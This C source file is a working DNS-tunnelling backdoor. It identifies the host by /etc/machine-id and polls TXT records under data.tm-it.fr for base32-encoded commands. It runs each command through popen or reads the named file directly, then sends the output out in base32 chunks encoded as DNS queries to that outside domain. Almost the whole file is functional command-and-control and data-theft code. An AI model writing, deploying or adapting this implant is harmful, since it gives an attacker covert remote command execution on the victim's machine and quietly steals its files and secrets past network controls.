#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/nameser.h>
#include <resolv.h>
#include <stdint.h>
#include <sys/types.h>

#define BASE_DOMAIN "data.tm-it.fr"
#define CHUNK_SIZE 30 
#define MAX_OUTPUT_SIZE 50000

static int return_value = 0;

int base32_char_to_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a';
    if (c >= '2' && c <= '7') return c - '2' + 26;
    return -1;
}

int decode_base32(const char *input, uint8_t *output) {
    int len = strlen(input);
    int bit_buffer = 0;
    int bits_collected = 0;
    int output_idx = 0;

    for (int i = 0; i < len; i++) {
        if (input[i] == '=') break;

        int val = base32_char_to_val(input[i]);
        if (val == -1) continue;

        bit_buffer = (bit_buffer << 5) | val;
        bits_collected += 5;

        if (bits_collected >= 8) {
            output[output_idx++] = (bit_buffer >> (bits_collected - 8)) & 0xFF;
            bits_collected -= 8;
        }
    }
    return output_idx;
}

void base32_encode(const unsigned char *src, size_t src_len, char *dst) {
    const char chars[] = "abcdefghijklmnopqrstuvwxyz234567";
    size_t i = 0, j = 0;
    unsigned int val = 0;
    int bits = 0;

    for (i = 0; i < src_len; i++) {
        val = (val << 8) | src[i];
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            dst[j++] = chars[(val >> bits) & 0x1F];
        }
    }
    if (bits > 0) {
        dst[j++] = chars[(val << (5 - bits)) & 0x1F];
    }
    dst[j] = '\0';
}

void get_dns_txt_record(const char *fqdn, char *output_txt, size_t max_len) {
    unsigned char nsbuf[4096];
    res_init();

    int len = res_search(fqdn, C_IN, T_TXT, nsbuf, sizeof(nsbuf));
    if (len < 0) return;

    if (output_txt == NULL || max_len == 0) return;

    ns_msg msg;
    if (ns_initparse(nsbuf, len, &msg) < 0) return;

    for (int x = 0; x < ns_msg_count(msg, ns_s_an); x++) {
        ns_rr rr;
        if (ns_parserr(&msg, ns_s_an, x, &rr) == 0) {
            if (ns_rr_type(rr) == T_TXT) {
                const unsigned char *rdata = ns_rr_rdata(rr);
                unsigned int txt_len = rdata[0]; 
                
                if (txt_len < max_len) {
                    memcpy(output_txt, rdata + 1, txt_len);
                    output_txt[txt_len] = '\0';
                    return; 
                }
            }
        }
    }
}

void exfiltrate_data(const unsigned char *data, const char *id_machine, size_t len) {
    size_t offset = 0;
    int chunk_index = 0;
    unsigned char chunk[CHUNK_SIZE + 1];
    char encoded_chunk[128];
    char fqdn[254];

    while (offset < len) {
        size_t current_chunk_size = len - offset;
        if (current_chunk_size > CHUNK_SIZE) {
            current_chunk_size = CHUNK_SIZE;
        }
        
        memset(chunk, 0, sizeof(chunk));
        memcpy(chunk, data + offset, current_chunk_size);

        memset(encoded_chunk, 0, sizeof(encoded_chunk));
        base32_encode(chunk, current_chunk_size, encoded_chunk);

        snprintf(fqdn, sizeof(fqdn), "%d.%s.cmd.%s.%s", chunk_index, encoded_chunk, id_machine, BASE_DOMAIN);
        printf("Sending chunk #%d : %s\n", chunk_index, fqdn);
        
        get_dns_txt_record(fqdn, NULL, 0);

        offset += current_chunk_size;
        chunk_index++;
        usleep(50000); 
    }
}

size_t execute_cat_command(char *cmd, unsigned char *output, size_t max_size) {
    for (int i = 0; i != 4; i++) {
        cmd++;
    }
    printf("Executing command : %s\n", cmd);

    FILE *file = fopen(cmd, "rb");
    if (file == NULL) {
        perror("can't open file");
        return_value = -1;
        return 0;
    }

    fseek(file, 0, SEEK_END);
    long length = ftell(file);
    rewind(file);

    if (length > (long)max_size) {
        printf("file is too large to read\n");
        fclose(file);
        return_value = -1;
        return 0;
    }

    size_t red = fread(output, 1, length, file);
    
    if (red != (size_t)length) {
        perror("can't read file or file is truncated");
        fclose(file);
        return_value = -1;
        return length;
    }

    fclose(file);

    return red;
}

size_t execute_command(char *cmd, unsigned char *output, size_t max_size) {
    size_t bytes_read;
    printf("Executing command : %s\n", cmd);
    if (sizeof(cmd) >= 4 && strncmp(cmd, "cat", 3) == 0) {
        bytes_read = execute_cat_command(cmd, output, max_size);
        if (return_value == -1) {
            return 0;
        }
        return bytes_read;
    }
    FILE *fp = popen(cmd, "r");
    if (fp == NULL) {
        snprintf((char*)output, max_size, "[-] Échec d'exécution de popen");
        return 0;
    }

    bytes_read = fread(output, 1, max_size - 1, fp);
    output[bytes_read] = '\0';
    
    pclose(fp);
    return bytes_read;
}

void get_machine_id(char *machine_id) {
    FILE *fd = fopen("/etc/machine-id", "r");
    if (fd && fgets(machine_id, 33, fd)) {
        machine_id[strcspn(machine_id, "\n")] = '\0';
    }
    if (fd) fclose(fd);
}

int main() {
    char id_machine[33] = {0};
    char command[256] = {0};
    char fqdn[254] = {0};
    unsigned char *cmd_output = malloc(MAX_OUTPUT_SIZE * sizeof(unsigned char));
    char decoded_cmd[256];
    int dec_len;
    size_t output_len;

    get_machine_id(id_machine);
    if (strlen(id_machine) == 0) {
        free(cmd_output);
        return 1;
    }

    while (1) {
        snprintf(fqdn, sizeof(fqdn), "cmd.%s.%s", id_machine, BASE_DOMAIN);
        printf("Asking for a command from server...\n");
        get_dns_txt_record(fqdn, command, sizeof(command));

        if (strlen(command) != 0) {
            printf("Command to execute : %s\n", command);
    
            memset(decoded_cmd, 0, sizeof(decoded_cmd));
            dec_len = decode_base32(command, (uint8_t*)decoded_cmd);
            decoded_cmd[dec_len] = '\0';
            memset(cmd_output, 0, MAX_OUTPUT_SIZE);
            output_len = execute_command(decoded_cmd, cmd_output, MAX_OUTPUT_SIZE);

            exfiltrate_data(cmd_output, id_machine, output_len);

            snprintf(fqdn, sizeof(fqdn), "finished.cmd.%s.%s", id_machine, BASE_DOMAIN);
            get_dns_txt_record(fqdn, NULL, 0);
        }
        command[0] = '\0';
        sleep(60);
    }
    free(cmd_output);
    return 0;
}